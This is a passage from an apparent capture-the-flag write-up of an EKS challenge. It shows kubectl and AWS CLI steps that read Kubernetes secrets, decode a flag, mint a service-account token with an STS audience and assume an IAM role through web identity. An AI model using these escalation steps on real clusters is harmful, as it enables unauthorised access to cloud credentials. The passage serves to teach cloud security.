<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="bash" data-theme="default"><code data-language="bash" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">export</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">TOKEN=$(</span><span style="color: #F69D50">aws</span><span style="color: #96D0FF"> eks get-token </span><span style="color: #6CB6FF">--cluster-name</span><span style="color: #96D0FF"> eks-challenge-cluster</span><span style="color: #F47067">|</span><span style="color: #F69D50">jq</span><span style="color: #96D0FF"> '.status.token' </span><span style="color: #6CB6FF">-r</span><span style="color: #96D0FF">)</span></span>
<span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">kubectl</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">--token</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"</span><span style="color: #ADBAC7">$TOKEN</span><span style="color: #96D0FF">"</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">auth</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">can-i</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">--list</span></span>
<span data-line=""><span style="color: #F69D50">warning:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">the</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">list</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">may</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">be</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">incomplete:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">webhook</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">authorizer</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">does</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">not</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">support</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">user</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">rule</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">resolution</span></span>
<span data-line=""><span style="color: #F69D50">Resources</span><span style="color: #ADBAC7">                                       </span><span style="color: #96D0FF">Non-Resource</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">URLs</span><span style="color: #ADBAC7">   </span><span style="color: #96D0FF">Resource</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">Names</span><span style="color: #ADBAC7">     </span><span style="color: #96D0FF">Verbs</span></span>
<span data-line=""><span style="color: #F69D50">serviceaccounts/token</span><span style="color: #ADBAC7">                           []                  [debug-sa]         [create]</span></span>
<span data-line=""><span style="color: #F69D50">selfsubjectaccessreviews.authorization.k8s.io</span><span style="color: #ADBAC7">   []                  []                 [create]</span></span>
<span data-line=""><span style="color: #F69D50">selfsubjectrulesreviews.authorization.k8s.io</span><span style="color: #ADBAC7">    []                  []                 [create]</span></span>
<span data-line=""><span style="color: #F69D50">pods</span><span style="color: #ADBAC7">                                            []                  []                 [get list]</span></span>
<span data-line=""><span style="color: #F69D50">secrets</span><span style="color: #ADBAC7">                                         []                  []                 [get list]</span></span>
<span data-line=""><span style="color: #F69D50">serviceaccounts</span><span style="color: #ADBAC7">                                 []                  []                 [get list]</span></span>
<span data-line=""><span style="color: #ADBAC7">                                                [/api/</span><span style="color: #F47067">*</span><span style="color: #ADBAC7">]            []                 [get]</span></span>
<span data-line=""><span style="color: #ADBAC7">                                                [/api]              []                 [get]</span></span>
<span data-line=""><span style="color: #ADBAC7">                                                [/apis/</span><span style="color: #F47067">*</span><span style="color: #ADBAC7">]           []                 [get]</span></span>
<span data-line=""><span style="color: #ADBAC7">                                                [/apis]             []                 [get]</span></span>
<span data-line=""><span style="color: #ADBAC7">                                                [/healthz]          []                 [get]</span></span>
<span data-line=""><span style="color: #ADBAC7">                                                [/healthz]          []                 [get]</span></span>
<span data-line=""><span style="color: #ADBAC7">                                                [/livez]            []                 [get]</span></span>
<span data-line=""><span style="color: #ADBAC7">                                                [/livez]            []                 [get]</span></span>
<span data-line=""><span style="color: #ADBAC7">                                                [/openapi/</span><span style="color: #F47067">*</span><span style="color: #ADBAC7">]        []                 [get]</span></span>
<span data-line=""><span style="color: #ADBAC7">                                                [/openapi]          []                 [get]</span></span>
<span data-line=""><span style="color: #ADBAC7">                                                [/readyz]           []                 [get]</span></span>
<span data-line=""><span style="color: #ADBAC7">                                                [/readyz]           []                 [get]</span></span>
<span data-line=""><span style="color: #ADBAC7">                                                [/version/]         []                 [get]</span></span>
<span data-line=""><span style="color: #ADBAC7">                                                [/version/]         []                 [get]</span></span>
<span data-line=""><span style="color: #ADBAC7">                                                [/version]          []                 [get]</span></span>
<span data-line=""><span style="color: #ADBAC7">                                                [/version]          []                 [get]</span></span>
<span data-line=""><span style="color: #F69D50">podsecuritypolicies.policy</span><span style="color: #ADBAC7">                      []                  [eks.privileged]   [use]</span></span></code></pre></div>
<p>Perfect!  We have more access which includes fetching secrets:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="bash" data-theme="default"><code data-language="bash" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">kubectl</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">--token</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"</span><span style="color: #ADBAC7">$TOKEN</span><span style="color: #96D0FF">"</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">get</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">secret</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">-o</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">json</span></span>
<span data-line=""><span style="color: #ADBAC7">{</span></span>
<span data-line=""><span style="color: #ADBAC7">    </span><span style="color: #F69D50">"apiVersion"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"v1",</span></span>
<span data-line=""><span style="color: #ADBAC7">    </span><span style="color: #F69D50">"items"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> [</span></span>
<span data-line=""><span style="color: #ADBAC7">        {</span></span>
<span data-line=""><span style="color: #ADBAC7">            </span><span style="color: #F69D50">"apiVersion"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"v1",</span></span>
<span data-line=""><span style="color: #ADBAC7">            </span><span style="color: #F69D50">"data"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">{</span></span>
<span data-line=""><span style="color: #ADBAC7">                </span><span style="color: #F69D50">"flag"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"d2l6X2Vrc19jaGFsbGVuZ2V7b25seV9hX3&#x3C;*REDACTED*>="</span></span>
<span data-line=""><span style="color: #ADBAC7">            },</span></span>
<span data-line=""><span style="color: #ADBAC7">            </span><span style="color: #F69D50">"kind"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"Secret",</span></span>
<span data-line=""><span style="color: #ADBAC7">            </span><span style="color: #F69D50">"metadata"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">{</span></span>
<span data-line=""><span style="color: #ADBAC7">                </span><span style="color: #F69D50">"creationTimestamp"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"2023-11-01T12:27:57Z",</span></span>
<span data-line=""><span style="color: #ADBAC7">                </span><span style="color: #F69D50">"name"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"node-flag",</span></span>
<span data-line=""><span style="color: #ADBAC7">                </span><span style="color: #F69D50">"namespace"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"challenge4",</span></span>
<span data-line=""><span style="color: #ADBAC7">                </span><span style="color: #F69D50">"resourceVersion"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"883574",</span></span>
<span data-line=""><span style="color: #ADBAC7">                </span><span style="color: #F69D50">"uid"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"26461a29-ec72-40e1-adc7-99128ce664f7"</span></span>
<span data-line=""><span style="color: #ADBAC7">            },</span></span>
<span data-line=""><span style="color: #ADBAC7">            </span><span style="color: #F69D50">"type"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"Opaque"</span></span>
<span data-line=""><span style="color: #ADBAC7">        }</span></span>
<span data-line=""><span style="color: #ADBAC7">    ],</span></span>
<span data-line=""><span style="color: #ADBAC7">    </span><span style="color: #F69D50">"kind"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"List",</span></span>
<span data-line=""><span style="color: #ADBAC7">    </span><span style="color: #F69D50">"metadata"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">{</span></span>
<span data-line=""><span style="color: #ADBAC7">        </span><span style="color: #F69D50">"resourceVersion"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">""</span></span>
<span data-line=""><span style="color: #ADBAC7">    }</span></span>
<span data-line=""><span style="color: #ADBAC7">}</span></span></code></pre></div>
<p>So we just need to base64 decode that and we are on to the next challenge!</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="bash" data-theme="default"><code data-language="bash" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">kubectl</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">--token</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"</span><span style="color: #ADBAC7">$TOKEN</span><span style="color: #96D0FF">"</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">get</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">secret</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">-o</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">json</span><span style="color: #ADBAC7"> </span><span style="color: #F47067">|</span><span style="color: #ADBAC7"> </span><span style="color: #F69D50">jq</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">'.items[0].data.flag'</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">-r</span><span style="color: #F47067">|</span><span style="color: #F69D50">base64</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">-d</span></span>
<span data-line=""><span style="color: #F69D50">wiz_eks_challenge</span><span style="color: #ADBAC7">{only_a_real_pro_can_navigate_&#x3C;*REDACTED*>}</span></span></code></pre></div>
<h1>Challenge 5</h1>
<p>The hint:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="" data-theme="default"><code data-language="" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #adbac7">You've successfully transitioned from a limited Service Account to a Node</span></span>
<span data-line=""><span style="color: #adbac7">Service Account! Great job. Your next challenge is to move from the EKS to the</span></span>
<span data-line=""><span style="color: #adbac7">AWS account.</span></span>
<span data-line=""><span style="color: #adbac7"></span></span>
<span data-line=""><span style="color: #adbac7">Can you acquire the AWS role of the s3access-sa service account, and get the flag?</span></span></code></pre></div>
<p>So lets start with checking what access we do have:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="bash" data-theme="default"><code data-language="bash" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">kubectl</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">whoami</span></span>
<span data-line=""><span style="color: #F69D50">system:node:challenge:ip-192-168-21-50.us-west-1.compute.internal</span></span></code></pre></div>
<p>Can we list buckets?</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="bash" data-theme="default"><code data-language="bash" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">aws</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">s3</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">ls</span></span>
<span data-line=""> </span>
<span data-line=""><span style="color: #F69D50">An</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">error</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">occurred</span><span style="color: #ADBAC7"> (AccessDenied) when calling the ListBuckets operation: Access Denied</span></span></code></pre></div>
<p>Nope!  So we need to figure out how to become the <code>s3access-sa</code>. What access do
we have?</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="bash" data-theme="default"><code data-language="bash" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">kubectl</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">auth</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">can-i</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">--list</span></span>
<span data-line=""><span style="color: #F69D50">warning:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">the</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">list</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">may</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">be</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">incomplete:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">webhook</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">authorizer</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">does</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">not</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">support</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">user</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">rule</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">resolution</span></span>
<span data-line=""><span style="color: #F69D50">Resources</span><span style="color: #ADBAC7">                                       </span><span style="color: #96D0FF">Non-Resource</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">URLs</span><span style="color: #ADBAC7">   </span><span style="color: #96D0FF">Resource</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">Names</span><span style="color: #ADBAC7">     </span><span style="color: #96D0FF">Verbs</span></span>
<span data-line=""><span style="color: #F69D50">serviceaccounts/token</span><span style="color: #ADBAC7">                           []                  [debug-sa]         [create]</span></span>
<span data-line=""><span style="color: #F69D50">selfsubjectaccessreviews.authorization.k8s.io</span><span style="color: #ADBAC7">   []                  []                 [create]</span></span>
<span data-line=""><span style="color: #F69D50">selfsubjectrulesreviews.authorization.k8s.io</span><span style="color: #ADBAC7">    []                  []                 [create]</span></span>
<span data-line=""><span style="color: #F69D50">pods</span><span style="color: #ADBAC7">                                            []                  []                 [get list]</span></span>
<span data-line=""><span style="color: #F69D50">secrets</span><span style="color: #ADBAC7">                                         []                  []                 [get list]</span></span>
<span data-line=""><span style="color: #F69D50">serviceaccounts</span><span style="color: #ADBAC7">                                 []                  []                 [get list]</span></span>
<span data-line=""><span style="color: #ADBAC7">                                                [/api/</span><span style="color: #F47067">*</span><span style="color: #ADBAC7">]            []                 [get]</span></span>
<span data-line=""><span style="color: #ADBAC7">                                                [/api]              []                 [get]</span></span>
<span data-line=""><span style="color: #ADBAC7">                                                [/apis/</span><span style="color: #F47067">*</span><span style="color: #ADBAC7">]           []                 [get]</span></span>
<span data-line=""><span style="color: #ADBAC7">                                                [/apis]             []                 [get]</span></span>
<span data-line=""><span style="color: #ADBAC7">                                                [/healthz]          []                 [get]</span></span>
<span data-line=""><span style="color: #ADBAC7">                                                [/healthz]          []                 [get]</span></span>
<span data-line=""><span style="color: #ADBAC7">                                                [/livez]            []                 [get]</span></span>
<span data-line=""><span style="color: #ADBAC7">                                                [/livez]            []                 [get]</span></span>
<span data-line=""><span style="color: #ADBAC7">                                                [/openapi/</span><span style="color: #F47067">*</span><span style="color: #ADBAC7">]        []                 [get]</span></span>
<span data-line=""><span style="color: #ADBAC7">                                                [/openapi]          []                 [get]</span></span>
<span data-line=""><span style="color: #ADBAC7">                                                [/readyz]           []                 [get]</span></span>
<span data-line=""><span style="color: #ADBAC7">                                                [/readyz]           []                 [get]</span></span>
<span data-line=""><span style="color: #ADBAC7">                                                [/version/]         []                 [get]</span></span>
<span data-line=""><span style="color: #ADBAC7">                                                [/version/]         []                 [get]</span></span>
<span data-line=""><span style="color: #ADBAC7">                                                [/version]          []                 [get]</span></span>
<span data-line=""><span style="color: #ADBAC7">                                                [/version]          []                 [get]</span></span>
<span data-line=""><span style="color: #F69D50">podsecuritypolicies.policy</span><span style="color: #ADBAC7">                      []                  [eks.privileged]   [use]</span></span></code></pre></div>
<p>Hmm, being able to create tokens for the <code>debug-sa</code> resource definitely seems
suspicious. So lets see if that will get us anywhere:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="bash" data-theme="default"><code data-language="bash" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">export</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">TOKEN=$(</span><span style="color: #F69D50">kubectl</span><span style="color: #96D0FF"> create token debug-sa)</span></span>
<span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">kubectl</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">--token</span><span style="color: #ADBAC7"> $TOKEN </span><span style="color: #96D0FF">auth</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">can-i</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">--list</span></span>
<span data-line=""><span style="color: #F69D50">warning:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">the</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">list</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">may</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">be</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">incomplete:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">webhook</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">authorizer</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">does</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">not</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">support</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">user</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">rule</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">resolution</span></span>
<span data-line=""><span style="color: #F69D50">Resources</span><span style="color: #ADBAC7">                                       </span><span style="color: #96D0FF">Non-Resource</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">URLs</span><span style="color: #ADBAC7">                     </span><span style="color: #96D0FF">Resource</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">Names</span><span style="color: #ADBAC7">     </span><span style="color: #96D0FF">Verbs</span></span>
<span data-line=""><span style="color: #F69D50">selfsubjectaccessreviews.authorization.k8s.io</span><span style="color: #ADBAC7">   []                                    []                 [create]</span></span>
<span data-line=""><span style="color: #F69D50">selfsubjectrulesreviews.authorization.k8s.io</span><span style="color: #ADBAC7">    []                                    []                 [create]</span></span>
<span data-line=""><span style="color: #ADBAC7">                                                [/.well-known/openid-configuration]   []                 [get]</span></span>
<span data-line=""><span style="color: #ADBAC7">                                                [/api/</span><span style="color: #F47067">*</span><span style="color: #ADBAC7">]                              []                 [get]</span></span>
<span data-line=""><span style="color: #ADBAC7">                                                [/api]                                []                 [get]</span></span>
<span data-line=""><span style="color: #ADBAC7">                                                [/apis/</span><span style="color: #F47067">*</span><span style="color: #ADBAC7">]                             []                 [get]</span></span>
<span data-line=""><span style="color: #ADBAC7">                                                [/apis]                               []                 [get]</span></span>
<span data-line=""><span style="color: #ADBAC7">                                                [/healthz]                            []                 [get]</span></span>
<span data-line=""><span style="color: #ADBAC7">                                                [/healthz]                            []                 [get]</span></span>
<span data-line=""><span style="color: #ADBAC7">                                                [/livez]                              []                 [get]</span></span>
<span data-line=""><span style="color: #ADBAC7">                                                [/livez]                              []                 [get]</span></span>
<span data-line=""><span style="color: #ADBAC7">                                                [/openapi/</span><span style="color: #F47067">*</span><span style="color: #ADBAC7">]                          []                 [get]</span></span>
<span data-line=""><span style="color: #ADBAC7">                                                [/openapi]                            []                 [get]</span></span>
<span data-line=""><span style="color: #ADBAC7">                                                [/openid/v1/jwks]                     []                 [get]</span></span>
<span data-line=""><span style="color: #ADBAC7">                                                [/readyz]                             []                 [get]</span></span>
<span data-line=""><span style="color: #ADBAC7">                                                [/readyz]                             []                 [get]</span></span>
<span data-line=""><span style="color: #ADBAC7">                                                [/version/]                           []                 [get]</span></span>
<span data-line=""><span style="color: #ADBAC7">                                                [/version/]                           []                 [get]</span></span>
<span data-line=""><span style="color: #ADBAC7">                                                [/version]                            []                 [get]</span></span>
<span data-line=""><span style="color: #ADBAC7">                                                [/version]                            []                 [get]</span></span>
<span data-line=""><span style="color: #F69D50">podsecuritypolicies.policy</span><span style="color: #ADBAC7">                      []                                    [eks.privileged]   [use]</span></span></code></pre></div>
<p>Looks like we have less access than before.  So not too helpful, lets take a
look at that service account we want to become:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="bash" data-theme="default"><code data-language="bash" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">kubectl</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">get</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">sa</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">s3access-sa</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">-o</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">json</span></span>
<span data-line=""><span style="color: #ADBAC7">{</span></span>
<span data-line=""><span style="color: #ADBAC7">    </span><span style="color: #F69D50">"apiVersion"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"v1",</span></span>
<span data-line=""><span style="color: #ADBAC7">    </span><span style="color: #F69D50">"kind"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"ServiceAccount",</span></span>
<span data-line=""><span style="color: #ADBAC7">    </span><span style="color: #F69D50">"metadata"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">{</span></span>
<span data-line=""><span style="color: #ADBAC7">        </span><span style="color: #F69D50">"annotations"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">{</span></span>
<span data-line=""><span style="color: #ADBAC7">            </span><span style="color: #F69D50">"eks.amazonaws.com/role-arn"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"arn:aws:iam::688655246681:role/challengeEksS3Role"</span></span>
<span data-line=""><span style="color: #ADBAC7">        },</span></span>
<span data-line=""><span style="color: #ADBAC7">        </span><span style="color: #F69D50">"creationTimestamp"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"2023-10-31T20:07:34Z",</span></span>
<span data-line=""><span style="color: #ADBAC7">        </span><span style="color: #F69D50">"name"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"s3access-sa",</span></span>
<span data-line=""><span style="color: #ADBAC7">        </span><span style="color: #F69D50">"namespace"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"challenge5",</span></span>
<span data-line=""><span style="color: #ADBAC7">        </span><span style="color: #F69D50">"resourceVersion"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"671916",</span></span>
<span data-line=""><span style="color: #ADBAC7">        </span><span style="color: #F69D50">"uid"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">"86e44c49-b05a-4ebe-800b-45183a6ebbda"</span></span>
<span data-line=""><span style="color: #ADBAC7">    }</span></span>
<span data-line=""><span style="color: #ADBAC7">}</span></span></code></pre></div>
<p>I think we are going to need to use our AWS access to assume that role, I don't
believe our kubernetes access is going to get us anywhere:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="bash" data-theme="default"><code data-language="bash" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">aws</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">sts</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">assume-role</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">--role-arn</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">arn:aws:iam::688655246681:role/challengeEksS3Role</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">--role-session-name</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">test</span></span>
<span data-line=""> </span>
<span data-line=""><span style="color: #F69D50">An</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">error</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">occurred</span><span style="color: #ADBAC7"> (AccessDenied) when calling the AssumeRole operation: User: arn:aws:sts::688655246681:assumed-role/eks-challenge-cluster-nodegroup-NodeInstanceRole/i-0cb922c6673973282 is not authorized to perform: sts:AssumeRole on resource: arn:aws:iam::688655246681:role/challengeEksS3Role</span></span></code></pre></div>
<p>Ok, so <em>maybe</em> our kubernetes access is important since we can't assume the role
directly.   Lets try to use that $TOKEN from <code>debug-sa</code> to assume the role:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="bash" data-theme="default"><code data-language="bash" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">aws</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">sts</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">assume-role-with-web-identity</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">--role-arn</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">arn:aws:iam::688655246681:role/challengeEksS3Role</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">--role-session-name</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">test</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">--web-identity-token</span><span style="color: #ADBAC7"> $TOKEN</span></span>
<span data-line=""> </span>
<span data-line=""><span style="color: #F69D50">An</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">error</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">occurred</span><span style="color: #ADBAC7"> (InvalidIdentityToken) when calling the AssumeRoleWithWebIdentity operation: Incorrect token audience</span></span></code></pre></div>
<p>Getting closer!   The default audience for a token created with <code>kubectl</code> is
<code>https://kubernetes.default.svc</code> which amazon doesn't seem to like.  Lets try
creating it again with <code>sts.amazonaws.com</code>:</p>
<div data-rehype-pretty-code-fragment=""><pre class="github-dark-dimmed" style="background-color: #22272e" tabindex="0" data-language="bash" data-theme="default"><code data-language="bash" data-theme="default" style="display: grid;"><span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">export</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">TOKEN=$(</span><span style="color: #F69D50">kubectl</span><span style="color: #96D0FF"> create token debug-sa </span><span style="color: #6CB6FF">--audience</span><span style="color: #96D0FF"> sts.amazonaws.com)</span></span>
<span data-line=""><span style="color: #F69D50">❯</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">aws</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">sts</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">assume-role-with-web-identity</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">--role-arn</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">arn:aws:iam::688655246681:role/challengeEksS3Role</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">--role-session-name</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">test</span><span style="color: #ADBAC7"> </span><span style="color: #6CB6FF">--web-identity-token</span><span style="color: #ADBAC7"> $TOKEN</span></span>
<span data-line=""><span style="color: #ADBAC7">{</span></span>
<span data-line=""><span style="color: #ADBAC7">    </span><span style="color: #F69D50">"Credentials"</span><span style="color: #6CB6FF">:</span><span style="color: #ADBAC7"> </span><span style="color: #96D0FF">{</span></span>
